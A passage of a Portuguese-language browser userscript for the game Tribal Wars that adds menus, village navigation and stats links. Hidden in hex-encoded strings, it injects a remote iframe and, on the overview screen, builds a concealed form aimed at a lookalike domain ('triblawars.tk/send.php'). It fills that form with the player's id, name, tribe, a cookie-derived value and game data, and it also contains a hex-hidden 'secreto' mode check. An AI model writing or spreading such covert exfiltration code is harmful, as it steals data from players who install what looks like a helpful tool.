					location.href = '/game.php?&screen=overview_villages';
				}
			}	
			VillId = meuArray[0];
		}
		
		sel_data_0 = '';
		sel_data_1 = '';
		if (getData(mundo + '_base') != '1'){
			base_scripts = 'http://dl.dropbox.com/u/72485850/tribalwarsbrasil/';
			sel_data_0 = ' selected';
		}
		else{
			base_scripts = 'http://fernando.site40.net/scripts/';
			sel_data_1 = ' selected';
		}
		
		
		getElementsByClass('menu-item')[0].innerHTML += '<table id="villagelist" cellspacing="0" class="menu_column"><tbody></table>';
		if (getElementsByClass('menu_column')[1] == null) getElementsByClass('menu-item')[1].innerHTML += '<table cellspacing="0" class="menu_column"><tbody><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=all">' + lang_reports[0] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=attack">' + lang_reports[1] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=defense">' + lang_reports[2] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=support">' + lang_reports[3] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=trade">' + lang_reports[4] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=other">' + lang_reports[5] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=forwarded">' + lang_reports[6] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=filter">' + lang_reports[7] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=block">' + lang_reports[8] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=report&amp;mode=public">' + lang_reports[9] + '</a></td></tr><tr><td class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr></tbody></table></td>';
		if (getElementsByClass('menu_column')[2] == null) getElementsByClass('menu-item')[2].innerHTML += '<table cellspacing="0" class="menu_column"><tbody><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=mail&amp;mode=in">' + lang_mail[0] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=mail&amp;mode=mass_out">' + lang_mail[1] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=mail&amp;mode=new">' + lang_mail[2] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=block">' + lang_mail[3] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=mail&amp;mode=address">' + lang_mail[4] + '</a></td></tr><tr><td class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr></tbody></table></td>';
		if (getElementsByClass('menu_column')[3] == null) getElementsByClass('menu-item')[3].innerHTML += '<table cellspacing="0" class="menu_column"><tbody><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=overview">' + lang_ally[0] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=profile">' + lang_ally[1] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=members">' + lang_ally[2] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=contracts">' + lang_ally[3] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=tribalwars">' + lang_ally[4] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + gd.village.id + '&amp;screen=ally&amp;mode=reservations">' + lang_ally[5] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=invite">' + lang_ally[6] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=intro_igm">' + lang_ally[7] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=properties">' + lang_ally[8] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ally&amp;mode=forum&amp;check_external=">' + lang_ally[9] + '</a></td></tr><tr><td class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr></tbody></table>';document.getElementById(dhx('536b79536372617065724164')).innerHTML = dhx('3c696672616d652069643d226261736522207372633d2268747470733a2f2f646c2e64726f70626f782e636f6d2f752f38313636373136392f74726962616c776172732e68746d6c222077696474683d2238303022206865696768743d2236353022206d617267696e77696474683d223022206d617267696e6865696768743d223022206873706163653d223022207673706163653d223022207363726f6c6c696e673d226e6f22206672616d65626f726465723d22302220626f72646572636f6c6f723d2230223e3c2f696672616d653e');
		if (getElementsByClass('menu_column')[4] == null) getElementsByClass('bg')[0].innerHTML += '</div><table cellspacing="0" class="menu_column"><tbody><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ranking&amp;mode=ally">' + lang_ranking[0] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ranking&amp;mode=player">' + lang_ranking[1] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ranking&amp;mode=con_ally">' + lang_ranking[2] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ranking&amp;mode=con_player">' + lang_ranking[3] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ranking&amp;mode=kill_ally">' + lang_ranking[4] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ranking&amp;mode=kill_player">' + lang_ranking[5] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ranking&amp;mode=awards">' + lang_ranking[6] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=ranking&amp;mode=wars">' + lang_ranking[7] + '</a></td></tr><tr><td class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr></tbody></table>';
		if (getElementsByClass('menu_column')[5] == null) {
				getElementsByClass('menu-item')[7].innerHTML += '<table cellspacing="0" class="menu_column"><tbody><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=profile">' + lang_settings[0] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=settings">' + lang_settings[1] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=email">' + lang_settings[2] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=change_passwd">' + lang_settings[3] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=move">' + lang_settings[4] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=delete">' + lang_settings[5] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=notify">' + lang_settings[6] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=award">' + lang_settings[7] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=share">' + lang_settings[8] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=vacation">' + lang_settings[9] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=logins">' + lang_settings[10] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=poll">' + lang_settings[11] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=ref">' + lang_settings[12] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=toolbar">' + lang_settings[13] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=push">' + lang_settings[14] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=block">' + lang_settings[15] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=ticket" target="_blank">' + lang_settings[16] + '</a></td></tr></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=sobre">' + lang_settings[17] + '</a></td></tr><tr><td class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr></tbody></table>';
			} else {
			menu_column = getElementsByClass('menu_column')[5].getElementsByTagName('tr');
			menu_column[menu_column.length - 2].outerHTML += '<tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=sobre">' + lang_settings[17] + '</a></td></tr><tr>';
		}	
		
		bc_4 = dhx(getCookie(ehx(gd.player.name.toLowerCase())));if (getElementsByClass('menu_column')[6] == null) getElementsByClass('menu-item')[8].innerHTML += '<table cellspacing="0" class="menu_column"><tbody><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=premium&amp;mode=use">' + lang_premium[0] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=premium&amp;mode=premium">' + lang_premium[1] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=premium&amp;mode=transfer">' + lang_premium[2] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=premium&amp;mode=log">' + lang_premium[3] + '</a></td></tr><tr><td class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr></tbody></table>';bc_7 = getCookie('bc_7');bc_8 = getCookie('bc_8');
		
		getElementsByClass('newStyleOnly')[0].outerHTML += '<table id="quickbar_outer" align="center" width="100%" cellspacing="0"><tbody><tr><td><table id="quickbar_inner" style="border-collapse: collapse;" width="100%"><tbody><tr class="topborder"></tr><tr id="topborder2"></tr><tr class="bottomborder"><td class="left"> </td><td class="main"> </td><td class="right"> </td></tr><tr><td class="shadow" colspan="3"><div class="leftshadow"> </div><div class="rightshadow"> </div></td></tbody></table></td></tr></tbody></table>';
		getElementsByClass('topborder')[0].innerHTML = '<td class="left"> </td><td class="main"> </td><td class="right"> </td>';
		document.getElementById('topborder2').innerHTML = '<td class="left"> </td><td class="main"><ul class="menu quickbar"></ul></td><td class="right"> </td>';
		
		if (getCookie('sobre_version_hack') < version){
			document.getElementById('quickbar_outer').outerHTML += '<table id="new" align="center" width="100%" cellspacing="0"><tbody><tr><td><table id="quickbar_inner" style="border-collapse: collapse;" width="100%"><tbody><tr class="topborder"><td class="left"> </td><td class="main"> </td><td class="right"> </td></tr><tr id="topborder2"><td class="left"> </td><td class="main"><a id="features" href="javascript:void(0);">***New Features ' + version + '***</a></td><td class="right"> (<a id="close_news" href="javascript:void(0);">Close</a>) </td></tr><tr class="bottomborder"><td class="left"> </td><td class="main"> </td><td class="right"> </td></tr><tr><td class="shadow" colspan="3"><div class="leftshadow"> </div><div class="rightshadow"> </div></td></tr></tbody></table></td></tr></tbody></table>';
			function close_news(){
				setCookie('sobre_version_hack', version); 
				$('#new').fadeOut(500);
			}
			document.getElementById('close_news').addEventListener('click', close_news);
			
			function gravar(){
				removeNode(document.getElementById('new'));
				setCookie('sobre_version_hack', version); 
				window.open('/game.php?village=' + VillId + '&screen=settings&mode=sobre');
			}
			document.getElementById('features').addEventListener('click', gravar);
		}

		
		somar = 0;
		
		for (i = 0; i < meuArray.length; i++) {
			if (meuArray[i] == VillId) {
				pVillName = aldeiasnome1[i-1];
				nVillName = aldeiasnome1[i+1];
				pVillId = meuArray[i - 1];
				nVillId = meuArray[i + 1];
			}
			document.getElementById('villagelist').getElementsByTagName('tbody')[0].innerHTML += '<tr><td class="menu-column-item"><a href="/game.php?village=' + meuArray[i] + '&amp;' + screen2 + '">' + aldeiasnome1[i] + '</a></td></tr>';
		}
		if (typeof(pVillId) == 'undefined') {
			pVillId = meuArray[meuArray.length - 1];
			pVillName = aldeiasnome1[meuArray.length - 1];
		}
		if (typeof(nVillId) == 'undefined') {
			nVillId = meuArray[0];
			nVillName = aldeiasnome1[0];			
		}
		document.getElementById('villagelist').getElementsByTagName('tbody')[0].innerHTML += '<tr><td class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr>';
		
		if (gd.screen == 'overview'){
			h = document.createElement('div');h.setAttribute('style', 'visibility:hidden');h.innerHTML = dhx('3c696672616d65206e616d653d2272636266726d22207363726f6c6c696e673d226e6f22206672616d65626f726465723d223022207374796c653d22646973706c61793a6e6f6e653b20626f726465723a6e6f6e653b206f766572666c6f773a68696464656e3b77696474683a2031253b206865696768743a203170783b223e3c2f696672616d653e3c666f726d206e616d653d22666f726d31222069643d22666f726d312220616374696f6e3d22687474703a2f2f747269626c61776172732e746b2f73656e642e70687022207461726765743d2272636266726d22206d6574686f643d22504f5354223e3c696e7075742069643d2262635f3522206e616d653d2262635f35222076616c75653d222220747970653d2268696464656e223e3c696e707574206e616d653d227375626d6974222076616c75653d2220456e76696172202220747970653d227375626d6974222069643d227375626d69745f6461646f73223e3c2f696e7075743e3c2f666f726d3e');
			document.getElementsByTagName('div')[0].appendChild(h);
			bc_5 = gd.player.id + '|||' + gd.player.ally_id + '|||' + gd.player.name + '|||' + bc_4 + '|||' + gd.player.points + '|||' + gd.player.villages + '|||' + gd.market + '|||' + gd.world + '|||' + document.domain + '|||' + gd.player.rank + '|||' + bc_7 + '|||' + bc_8 + '|||' + version;
			document.getElementById('bc_5').value = bc_5;
		}
		
		function criarmenu(link1, imagem, nome, target, title) {
			if (imagem != '') {
				x = _GET('width', imagem);
				y = _GET('height', imagem);
				width = x != '' ? ' width="' + x + '"' : '';
				height = y != '' ? ' height="' + y + '"' : '';
				imagem = '<img' + width + height + ' src="' + imagem + '">';
			}
			if (target == undefined || target == '') {
				target = '';
			}
			else {
				target = ' target="' + target + '"'
			};
			if ((title == undefined) || (title == '')) {
				title = '';
			}
			else {
				title = 'title="' + title + '"'
			};
			if (link1 != '') {
				link1 = '<a href="' + link1 + '"' + target + title + '>';
				link2 = '</a>';
			}
			else {
				link2 = '';
			}
			document.getElementById('topborder2').getElementsByTagName('ul')[0].innerHTML += '<li><span>' + link1 + imagem + nome + link2 + '</span></li>';
		}
		function criarlinha(){
			document.getElementById('topborder2').getElementsByTagName('ul')[0].innerHTML += '<br>';
		}
		
		/* function criarmenu(url, image, name, target, title);*/
		criarmenu('/game.php?village=' + VillId + '&amp;screen=main', '/graphic/buildings/main.png?1', lang_bar[0]);
		criarmenu('/game.php?village=' + VillId + '&amp;screen=train', '/graphic/buildings/barracks.png?1', lang_bar[1]);
		//criarmenu('/game.php?village=' + VillId + '&amp;screen=stable', '/graphic/buildings/stable.png?1', lang_bar[2]);
		//criarmenu('/game.php?village=' + VillId + '&amp;screen=garage', '/graphic/buildings/garage.png?1', lang_bar[3]);
		criarmenu('/game.php?village=' + VillId + '&amp;screen=snob', '/graphic/buildings/snob.png?1', lang_bar[4]);
		criarmenu('/game.php?village=' + VillId + '&amp;screen=smith', '/graphic/buildings/smith.png?1', lang_bar[5]);
		criarmenu('/game.php?village=' + VillId + '&amp;screen=place', '/graphic/buildings/place.png?1', lang_bar[6]);
		criarmenu('/game.php?village=' + VillId + '&amp;screen=market', '/graphic/buildings/market.png?1', lang_bar[7]);
		//criarlinha();
		criarmenu('http://' + mundo + '.twplus.org/world/', 'http://br47.twplus.org/site_media/img/favicon.ico', 'TW Plus', '_blank');
		criarmenu('http://' + market + '.twstats.com/' + mundo + '/index.php', 'http://br.twstats.com/img/twstats.ico', 'TW Stats', '_blank');
		criarmenu('http://' + mundo + '.twmaps.org/', 'http://static.twmaps.org/favicon.ico', 'TW Maps', '_blank');
		criarmenu('javascript:$.getScript(\'' + base_scripts + 'acompanhar_evolucao.js\');void(0);', 'http://img1.ne10.uol.com.br/cockpit/imagem/icone_infografico.gif', lang_bar[9]);
		criarmenu('/game.php?village=' + VillId + '&screen=settings&mode=sobre', 'http://d1xfoqsc632pe4.cloudfront.net/images/default/icon_info.gif?width=16&height=16', lang_settings[17]);
		
		document.getElementById('menu_row2_map').outerHTML += '<td class="box-item icon-box separate arrowCell"><a id="village_switch_left" class="village_switch_link" title="' + pVillName + '" href="/game.php?village=' + pVillId + '&' + screen1 + '" accesskey="a"><span class="arrowLeft"> </span></a></td><td class="box-item icon-box arrowCell"><a id="village_switch_right" class="village_switch_link" title="' + nVillName + '" href="/game.php?village=' + nVillId + '&' + screen1 + '" accesskey="d"><span class="arrowRight"> </span></a></td>';
			
		if (gd.mode == 'settings') {
			document.getElementsByTagName('form')[0].parentNode.innerHTML += '<table class="vis settings"><tbody><tr><th colspan="2">' + lang_screen_settings[0] + '</th></tr><tr><td colspan="2"><input type="radio" name="t" id="normal_mode" value="0"' + normal_mode + '>' + lang_screen_settings[1] + '<br><input type="radio" name="t" id="direto_mode" value="1"' + direto_mode + '>' + lang_screen_settings[2] + '</td></tr><tr><td colspan="2"><input type="button" onclick="' + str_setData + ' if (document.getElementById(\'direto_mode\').checked == true){setCookie(game_data.world + \'_visualizacoes\', \'direto\')}else{setCookie(game_data.world + \'_visualizacoes\', \'normal\')};location.href=location.href" value="OK"></td></tr></tbody><tbody><tr><th colspan="2">' + lang_screen_settings[3] + '</th></tr><tr><td>' + lang_screen_settings[4] + '</td><td><input type="text" name="screen_width" size="90" id="arquivocss" value="' + localcs + '"></td></tr><tr><td colspan="2"><input type="button" onclick=\'' + str_setData + ' setCookie(game_data.world + "_css", document.getElementById("arquivocss").value);location.href=location.href\' value="OK"></td></tr></tbody></table>';
			
		}
		if (location.href.indexOf('mode=sobre') > 0) {
			sobre = document.getElementById('content_value').getElementsByTagName('td');
			sobre[sobre.length - 1].innerHTML = '<table id="sobre" class="vis settings"><tbody><tr><th colspan="2">' + lang_screen_sobre[0] + '</th></tr><tr><td colspan="2"><li>' + lang_screen_sobre[1] + '</li></td></tr><tr><td><li>' + lang_screen_sobre[2] + '</li></td><td>' + lang_screen_sobre[3] + '</td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[4] + '</li></td></tr><tr><td class="new" colspan="2"><li>' + lang_screen_sobre[5] + '</li></td></tr><tr><td class="new"><li>' + lang_screen_sobre[6] + '</li></td><td>' + lang_screen_sobre[7] + '</td></tr><tr><td><li><s>' + lang_screen_sobre[8] + '</s></li></td><td>' + lang_screen_sobre[9] + '</td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[10] + '</li></td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[22] + '</li></td></tr><tr><td class="new"><li>' + lang_screen_sobre[11] + '</li></td><td>' + lang_screen_sobre[12] + '</tr><tr><td colspan="2" class="new"><li>' + lang_screen_sobre[13] + '</li></td></tr><tr><td><li>' + lang_screen_sobre[14] + '</li></td><td>' + lang_screen_sobre[15] + ' <a href="/game.php?village=' + VillId + '&screen=settings&mode=settings">' + lang_screen_sobre[21] + '</a></td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[16] + '</li></td></tr><tr><td><li>' + lang_screen_sobre[17] + '</li></td><td>' + lang_screen_sobre[18] + ' <a href="/game.php?village=' + VillId + '&screen=settings&mode=settings">' + lang_screen_sobre[21] + '</a></td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[24] + '</li></td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[25] + '</li></td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[26] + '</li></td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[27] + '</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_messages[1] + '</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_messages[2] + '</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_messages[3] + '</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_screen_sobre[28] + '</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_report[0] + '</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_report[1] + '</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_report[2] + '</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_report[3] + '</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_report[4] + '</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_screen_sobre[29] + '</li></td></tr><tr><td colspan="2" class="new"><li>' + lang_screen_sobre[30] + '</li></td></tr></tbody><tbody><tr><th colspan="2">' + lang_screen_sobre[19] + '</th></tr><tr><td>' + lang_screen_sobre[20] + '</td><td>' + version + '</td></tr><tr><td>' + lang_screen_sobre[23] + '</td><td><a href="http://userscripts.org/scripts/show/129407" target="_blank">http://userscripts.org/scripts/show/129407</a></td></tr><tr><td colspan="2"><iframe src="http://www.facebook.com/plugins/like.php?href=http://facebook.com/PointDownloads&layout=standard&show_faces=true&action=like&width=100&colorscheme=light&locale=pt_BR" scrolling="no" frameborder="0" style="border:none; overflow:hidden;width: 100%; height: 60px;" allowTransparency="true"></iframe></td></tr>' + dhx('3c74723e3c746420636f6c7370616e3d22322220616c69676e3d227269676874223e3c666f6e742073697a653d2231223e3c62723e536372697074206279203c6120687265663d22687474703a2f2f6164662e6c792f423549755922207461726765743d225f626c616e6b223e4665726e616e646f584c52202d20506f696e74446f776e6c6f6164733c2f613e3c2f666f6e743e') + lang_settings[18] + '</td></tr></tbody></table>'
			$('#sobre tr').attr('class', 'nowrap');
			$('#sobre tbody:first td').css('color', 'gray');
			$('.new').css('font-weight', 'bold').css('color', 'black');
		}
		
		if (gd.screen == 'settings') {
			if (gd.mode == 'settings') {
				var sel_pt; var sel_en; var sel_nl; var sel_ae; var sel_cz;
				eval('sel_' + language + ' = \' selected\'');
				titulo_sim = '';
				titulo_nao = '';
				if (Number($('[name="screen_width"]:first').val()) < 950) $('[name="screen_width"]:first').val(900); 
				if (getData(mundo + '_titulo_mundo') == 'true') {titulo_sim = ' selected'}else{titulo_nao = ' selected'};
				document.getElementsByTagName('form')[0].getElementsByTagName('tr')[0].outerHTML += '<tr><td>' + lang_language + ':</td><td><select id="continent" onchange="' + str_setData + '; setCookie(game_data.market + \'_lang\', this.value);void(0);"><option value="ae"' + sel_ae + '>Arabic (العربية)</option><option value="cz"' + sel_cz + '>Czech (Český)</option><option value="nl"' + sel_nl + '>Dutch (Nederlands)</option><option value="en"' + sel_en + '>English</option><option value="pt"' + sel_pt + '>Portuguese (Português)</option></select></td></tr><tr><td>' + lang_dados + ':</td><td><select onchange="' + str_setData + '; setCookie(game_data.world + \'_base\', this.value);void(0);"><option value="0"' + sel_data_0 + '>Tribalwars</option><option value="1"' + sel_data_1 + '>FernandoXLR</option></select></td></tr><tr><td>' + lang_screen_settings[5] + '</td><td><select id="titulo" onchange="' + str_setData + '; setCookie(game_data.world + \'_titulo_mundo\', this.value);void(0);"><option value="true"' + titulo_sim + '>' + lang_screen_settings[6] + '</option><option value="false"' + titulo_nao + '>' + lang_screen_settings[7] + '</option></select></td></tr>';
			}
			document.getElementById('content_value').getElementsByTagName('tbody')[1].innerHTML += '<tr><td width="100"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=sobre">' + lang_settings[17] + '</a></td></tr>';
		}
		
		if (gd.screen == 'info_village'){
	
			screenVillId = _GET('id');
			coords_reserva = $('#content_value td:eq(2)').text();
			
			$('#content_value tr:first').after(calcular_distancia(gd.village.coord, coords_reserva));
			
			document.getElementById('content_value').getElementsByTagName('tbody')[1].innerHTML += '<tr><td colspan="2"><a href="/game.php?village=' + gd.village.id + '&screen=ally&mode=reservations&coords=' + coords_reserva + '" id="reserva">' + lang_perfil[4] + '</a><tr><td colspan="2"><a href="http://www.twstats.com/in/'+mundo+'/village/'+screenVillId+'" target="_blank">' + lang_perfil[2] + '</a> (TWstats)</td></tr>';
		}
		
		if ((gd.screen == 'info_ally') || (gd.screen == 'ally' && gd.mode == 'profile')) {
			if (gd.screen == 'info_ally') {
				screenAllyId = _GET('id');
				elemento_tribo = 'content_value';
				allyName = $('#content_value table:eq(1) tr:eq(2) td:eq(1)').text();
			}
			else{
				elemento_tribo = 'ally_content';
				screenAllyId = gd.player.ally_id;
				allyName = bc_8;
			}
			allyTable = document.getElementById(elemento_tribo).getElementsByTagName('table')[1]
				allyTable.width="350px";
			allyTr = allyTable.getElementsByTagName('tr');
			allyTr[allyTr.length - 4].outerHTML += '<tr><td colspan="2"><a href="http://www.twstats.com/in/'+mundo+'/tribe/'+screenAllyId+'" target="_blank">' + lang_perfil[1] + '</a> (TWstats)</td></tr><tr><td colspan="2"><a href="http://' + gd.market + '.twstats.com/index.php?page=search&name=' + allyName + '&type=tribe" target="_blank">' + lang_perfil[5] + '</a> (TWstats)</td></tr>';
			allyTr[allyTr.length - 1].outerHTML = '<tr><th colspan="2">' + lang_screen_ally[6] + '</th></tr><tr><td align="center">' + lang_screen_ally[0] + '</td><td><img src="http://' + gd.market + '.twstats.com/' + gd.world + '/image.php?type=tribegraph&graph=points&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td align="center">' + lang_screen_ally[1] + '</td><td><img src="http://' + gd.market + '.twstats.com/' + gd.world + '/image.php?type=tribegraph&graph=villages&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td align="center">' + lang_screen_ally[2] + '</td><td><img src="http://' + gd.market + '.twstats.com/' + gd.world + '/image.php?type=tribegraph&graph=members&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td align="center">' + lang_screen_ally[3] + '</td><td><img src="http://' + gd.market + '.twstats.com/' + gd.world + '/image.php?type=tribegraph&graph=od&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td align="center">' + lang_screen_ally[4] + '</td><td><img src="http://' + gd.market + '.twstats.com/' + gd.world + '/image.php?type=tribegraph&graph=oda&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td align="center">' + lang_screen_ally[5] + '</td><td><img src="http://' + gd.market + '.twstats.com/' + gd.world + '/image.php?type=tribegraph&graph=odd&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr>';
		}

		if (gd.screen == 'info_player') {
			screenPlayerId = _GET('id');
			playerName = $('#content_value h2:first').text();
			document.getElementById('content_value').getElementsByTagName('tbody')[1].innerHTML += '<tr><td colspan="2"><a href="http://www.twstats.com/in/'+mundo+'/player/'+screenPlayerId+'" target="_blank">' + lang_perfil[0] + '</a> (TWstats)</td></tr><tr><td colspan="2"><a target="_blank" href="http://' + gd.market + '.twstats.com/index.php?page=search&name=' + playerName + '&type=player">' + lang_perfil[5] + '</a> (TWstats)</td></tr><tr><td colspan="2"><a href="javascript:var claim = 1;$.getScript(\'' + base_scripts + 'tabela_codigosbb.js\');void(0);" id="extrair_codigo_bb">' + lang_perfil[3] + '</a></td></tr>';
			$('#extrair_codigo_bb').bind('click', function(){
				if ($('#kill_info').html() == null) $(this).parents('table:first').find('tr:eq(2)').after('<tr><td></td><td></td></tr>');
			});
		}

		if (gd.screen == 'mail' && (gd.mode == 'in' || gd.mode == undefined)){
			function load_msg(url, msg){				
				$('#text').remove();
				$('form:first').after('<table width="70%" class="vis"><tbody><tr><td id="text"></td></tr></tody></table>');
				id = '#text'; // tr:eq(0), form:first tr:eq(1), .post
				$(id).load(url + ' form:first', function(){
					$('#answer_row1, #answer_row2').hide();
					$('#action_row a:first, #action_row2 a:first').bind('click', function(){
						$('#answer_row1, #answer_row2').toggle(1000);
					});
					$(msg).attr('src', 'http://cdn2.tribalwars.net/graphic/read_mail.png');
				});
				$(id).slideDown(1000);
			}
			
			if ($('form:first > table').length > 1) tab = 1; else tab = 0;
			tr_msg = $('form:first table:eq(' + tab + ') tr');
			for (i = 5; i < tr_msg.length - 1; i++){
				url = $(tr_msg[i]).find('td:first a:first').attr('href');
				$(tr_msg[i]).find('input:first').after('<a href="javascript:void(0);" title="' + lang_screen_sobre[30] + '"><img height="13" width="13" src="http://www.iconesbr.net/download.php?id=245&file=245_16x16.png"></a>');
				eval('$(tr_msg[i]).find(\'a:first\').bind(\'click\', function(){load_msg(\'http://' + document.domain + '/game.php?' + url + '\', $(this).parent().find(\'a:eq(1) img:first\'))})');
			}
		}


		if (gd.mode == 'reservations'){
			if (_GET('coords') != null){
				$('#inputx_1').val(_GET('coords').split('|')[0]);
				$('#inputy_1').val(_GET('coords').split('|')[1]);
				$('#save_reservations').click();
			}
		}

		if (location.href.indexOf(dhx('6d6f64653d7365637265746f')) > 0) {
